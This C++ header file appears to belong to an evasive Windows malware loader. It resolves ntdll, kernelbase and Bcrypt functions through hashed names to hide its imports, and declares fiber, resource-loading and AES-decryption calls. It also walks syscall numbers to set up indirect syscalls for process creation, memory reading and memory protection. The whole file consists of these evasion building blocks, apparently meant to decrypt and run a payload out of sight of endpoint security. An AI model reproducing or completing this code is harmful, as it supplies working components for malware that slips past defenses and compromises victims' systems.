#pragma once
#include "resolvers.h"
#include "types.h"

HMODULE hNT = GetLoadedDllHandleH(776560387);
HMODULE hBcrypt = LoadLibraryW(L"Bcrypt.dll");
HMODULE hkb = GetLoadedDllHandleH(3314415166);

/* ntdll */
fNtWriteVirtualMemory NtWriteVirtualMemory = reinterpret_cast<fNtWriteVirtualMemory>(GetFunctionAddressH(hNT, 3966201525));
fNtAllocateVirtualMemory NtAllocateVirtualMemory = reinterpret_cast<fNtAllocateVirtualMemory>(GetFunctionAddressH(hNT, 3794193594));
fNtProtectVirtualMemory NtProtectVirtualMemory = reinterpret_cast<fNtProtectVirtualMemory>(GetFunctionAddressH(hNT, 3375077829));
fNtReadVirtualMemory NtReadVirtualMemory = reinterpret_cast<fNtReadVirtualMemory>(GetFunctionAddressH(hNT, 809892425));
fRtlInitUnicodeString RtlInitUnicodeString = reinterpret_cast<fRtlInitUnicodeString>(GetFunctionAddressH(hNT, 3384575400));
fRtlCreateProcessParametersEx RtlCreateProcessParametersEx = reinterpret_cast<fRtlCreateProcessParametersEx>(GetFunctionAddressH(hNT, 3996204138));
fnNtWaitForSingleObject NtWaitForSingleObject = (fnNtWaitForSingleObject)GetFunctionAddressH(hNT, 3052521384);
fNtCreateEvent NtCreateEvent = (fNtCreateEvent)GetFunctionAddressH(hNT, 2283725253);


/* kernelbase */
fnConvertThreadToFiber e_ConvertThreadToFiber = (fnConvertThreadToFiber)GetFunctionAddressH(hkb, 695607944);
fnCreateFiber e_CreateFiber = (fnCreateFiber)GetFunctionAddressH(hkb, 267739959);
fnSwitchToFiber e_SwitchToFiber = (fnSwitchToFiber)GetFunctionAddressH(hkb, 3567794878);
fnFindResourceW e_FindResourceW = (fnFindResourceW)GetFunctionAddressH(hkb, 3756652973);
fnLoadResource e_LoadResource = (fnLoadResource)GetFunctionAddressH(hkb, 3201064692);
fnLockResource e_LockResource = (fnLockResource)GetFunctionAddressH(hkb, 1095194177);
fnSizeofResource e_SizeofResource = (fnSizeofResource)GetFunctionAddressH(hkb, 2048804358);


/* Bcrypt */
fnBCryptOpenAlgorithmProvider e_BCryptOpenAlgorithmProvider = (fnBCryptOpenAlgorithmProvider)GetFunctionAddressH(hBcrypt, 4221130483);
fnBCryptGetProperty e_BCryptGetProperty = (fnBCryptGetProperty)GetFunctionAddressH(hBcrypt, 2942278670);
fnBCryptSetProperty e_BCryptSetProperty = (fnBCryptSetProperty)GetFunctionAddressH(hBcrypt, 3154873802);
fnBCryptGenerateSymmetricKey e_BCryptGenerateSymmetricKey = (fnBCryptGenerateSymmetricKey)GetFunctionAddressH(hBcrypt, 310260467);
fnBCryptDecrypt e_BCryptDecrypt = (fnBCryptDecrypt)GetFunctionAddressH(hBcrypt, 1772972920);
fnBCryptDestroyKey e_BCryptDestroyKey = (fnBCryptDestroyKey)GetFunctionAddressH(hBcrypt, 3493811731);
fnBCryptCloseAlgorithmProvider e_BCryptCloseAlgorithmProvider = (fnBCryptCloseAlgorithmProvider)GetFunctionAddressH(hBcrypt, 4284280008);


/* syscalls */

extern "C" {

	// SSN Variables
	DWORD dwNtCreateUserProccess = 0;
	DWORD dwNtReadVirtualMemory = 0;
	DWORD dwNtProtectVirtualMemory = 0;
	DWORD dwNtTerminateProcess = 0;

	// SYSCALL Variables

	UINT_PTR sysCallNtCreateProcess = 0;
	UINT_PTR sysCallNtRead = 0;
	UINT_PTR sysCallNtProtect = 0;
	UINT_PTR sysCallNtTerminate = 0;


};



PVOID s = GetSysCallByWalking(2050401239, &dwNtCreateUserProccess, &sysCallNtCreateProcess);
PVOID h = GetSysCallByWalking(809892425, &dwNtReadVirtualMemory, &sysCallNtRead);
PVOID i = GetSysCallByWalking(3375077829, &dwNtProtectVirtualMemory, &sysCallNtProtect);
PVOID t = GetSysCallByWalking(2224556388, &dwNtTerminateProcess, &sysCallNtTerminate);



